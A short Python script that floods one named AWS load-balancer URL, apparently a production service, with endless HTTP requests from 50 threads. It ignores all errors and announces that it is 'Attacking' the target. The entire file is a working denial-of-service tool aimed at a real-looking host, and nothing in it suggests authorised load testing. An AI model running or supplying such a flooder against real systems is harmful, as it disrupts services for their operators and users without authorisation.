import concurrent.futures
import urllib.request

URL = "http://prodpai-alb-684626271.us-east-1.elb.amazonaws.com/"

def spam():
    while True: 
        try:
            urllib.request.urlopen(URL, timeout=2)
        except:
            pass

print(f"Attacking {URL} ... Press Ctrl+C to stop.")
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    for _ in range(50):
        executor.submit(spam)